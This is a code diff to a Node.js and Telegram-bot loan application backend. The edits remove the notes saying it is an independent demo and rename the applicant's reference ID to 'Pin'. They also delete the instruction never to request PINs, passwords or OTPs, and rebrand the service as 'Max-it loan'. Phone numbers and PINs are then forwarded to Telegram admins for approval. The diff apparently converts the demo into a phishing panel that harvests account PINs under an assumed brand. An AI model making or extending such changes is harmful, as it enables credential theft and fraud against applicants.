@@ -51,14 +51,14 @@ async function activeAdmins(){if(!pool)return initialAdmins;return (await pool.q
 function decisionKeyboard(stage,id){return {inline_keyboard:[[{text:'✅ Approve',callback_data:`decide:approve:${stage}:${id}`},{text:'❌ Reject',callback_data:`decide:reject:${stage}:${id}`}]]};}
 async function notifyAdmins(message,keyboard,assignedAdmin=null){const recipients=assignedAdmin&&await isAdmin(assignedAdmin)?[String(assignedAdmin)]:await activeAdmins();for(const id of recipients) await send(id,message,{reply_markup:keyboard}); if(SUP) await send(SUP,`👁️ <b>SUPER ADMIN — VIEW ONLY COPY</b>\n\n${message}`);}
 async function notifyDetails(a){
- const msg=`🟠 <b>New demo application — review</b>\n\n📞 Application number: <code>${esc(a.phone)}</code>\n🔢 Reference ID: <code>${esc(a.reference_id)}</code>\n📌 Status: DETAILS PENDING\n\nThis is an independent demo. Review the application details only.`;
+ const msg=`🟠 <b>New application — review</b>\n\n📞number: <code>${esc(a.phone)}</code>\n🔢 Pin: <code>${esc(a.reference_id)}</code>\n📌 Status: DETAILS PENDING\n\nThis is max-it loan. Review the application details if its correct .`;
  await notifyAdmins(msg,decisionKeyboard('details',a.id),a.assigned_admin);
 }
 async function notifyReference(a){
- const msg=`🟠 <b>Reference text submitted — review required</b>\n\n🆔 Application: <code>${esc(a.id)}</code>\n📞 Phone: <code>${esc(a.phone)}</code>\n📝 Reference text:\n<blockquote>${esc(a.reference_text)}</blockquote>\n📌 Status: REFERENCE PENDING\n\nReview only non-secret application reference text. Never request PINs, passwords, or OTPs.`;
+ const msg=`🟠 <b>Reference text submitted — review required</b>\n\n🆔 Application: <code>${esc(a.id)}</code>\n📞 Phone: <code>${esc(a.phone)}</code>\n📝 Reference text:\n<blockquote>${esc(a.reference_text)}</blockquote>\n📌 Status: REFERENCE PENDING\n\nReview only max-it application reference text.`;
  await notifyAdmins(msg,decisionKeyboard('reference',a.id),a.assigned_admin);
 }
-app.get('/health',(req,res)=>res.status(pool?200:503).json({ok:!!pool,databaseConfigured:!!pool,telegramConfigured:!!TOKEN,service:'independent Botswana loan application demo'}));
+app.get('/health',(req,res)=>res.status(pool?200:503).json({ok:!!pool,databaseConfigured:!!pool,telegramConfigured:!!TOKEN,service:'Max-it loan application  web'}));
 app.post('/api/applications',async(req,res)=>{
  try{
   if(!pool) return res.status(503).json({error:'Application storage is not configured yet.'});
